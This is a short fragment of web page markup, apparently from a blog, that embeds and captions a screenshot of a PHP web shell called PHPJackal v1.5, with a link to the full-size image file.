[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/php_jackal_shell-1024x319.png" alt="PHPJackal v1.5 Shell screenshot" width="604" height="188" class="size-large wp-image-422" />][1]<figcaption class="wp-caption-text">PHPJackal v1.5 Shell screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/02/php_jackal_shell.png